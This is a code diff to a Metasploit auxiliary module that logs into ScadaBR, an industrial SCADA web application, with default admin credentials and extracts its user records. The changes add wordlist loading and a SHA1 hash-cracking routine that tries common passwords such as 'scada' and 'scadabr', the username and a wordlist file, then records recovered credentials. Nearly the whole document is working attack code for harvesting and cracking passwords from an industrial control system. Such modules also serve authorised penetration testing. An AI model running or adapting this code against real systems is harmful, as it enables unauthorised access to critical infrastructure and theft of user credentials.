@@ -30,7 +30,9 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8080),
         OptString.new('USERNAME',  [ true, 'The username for the application', 'admin' ]),
         OptString.new('PASSWORD',  [ true, 'The password for the application', 'admin' ]),
-        OptString.new('TARGETURI', [ true, 'The base path to ScadaBR', '/ScadaBR' ])
+        OptString.new('TARGETURI', [ true, 'The base path to ScadaBR', '/ScadaBR' ]),
+        OptPath.new('PASS_FILE',   [ false, 'Wordlist file to crack password hashes',
+          File.join(Msf::Config.data_directory, 'wordlists', 'unix_passwords.txt') ])
       ])
   end
 
@@ -106,6 +108,25 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  def load_wordlist(wordlist)
+    return unless File.exist? wordlist
+    File.open(wordlist, 'rb').each_line do |line|
+      @wordlist << line.chomp
+    end
+  end
+
+  def crack(user, hash)
+    return user if hash.eql? Rex::Text.sha1 user
+    pass = nil
+    @wordlist.each do |word|
+      if hash.eql? Rex::Text.sha1 word
+        pass = word
+        break
+      end
+    end
+    pass
+  end
+
   def run
     login datastore['USERNAME'], datastore['PASSWORD']
 
@@ -126,6 +147,9 @@ class MetasploitModule < Msf::Auxiliary
       print_error 'Found no user data'
     else
       print_good "Found #{json['users'].length} users"
+      @wordlist = *'0'..'9', *'A'..'Z', *'a'..'z'
+      @wordlist.concat(['12345', 'admin', 'password', 'scada', 'scadabr'])
+      load_wordlist datastore['PASS_FILE'] unless datastore['PASS_FILE'].nil?
     end
 
     json['users'].each do |user|
@@ -135,28 +159,19 @@ class MetasploitModule < Msf::Auxiliary
       admin = user['admin']
       mail = user['email']
       hash = Rex::Text.decode_base64(user['password']).unpack('H*').flatten.first
-      pass = nil
-
-      weak_passwords = '12345', 'admin', 'password', 'scada', 'scadabr', username, mail.split('@').first
-      weak_passwords.each do |weak_password|
-        if hash.eql? Rex::Text.sha1(weak_password)
-          pass = weak_password
-          break
-        end
-      end
-
+      pass = crack username, hash
       user_cred_table << [username, pass, hash, admin, mail]
 
       if pass
         print_status "Found weak credentials (#{username}:#{pass})"
         creds = { origin_type:     :service,
-                  module_fullname: self.fullname,
+                  module_fullname: fullname,
                   private_type:    :password,
                   private_data:    pass,
                   username:        user }
       else
         creds = { origin_type:     :service,
-                  module_fullname: self.fullname,
+                  module_fullname: fullname,
                   private_type:    :nonreplayable_hash,
                   private_data:    hash,
                   username:        user }
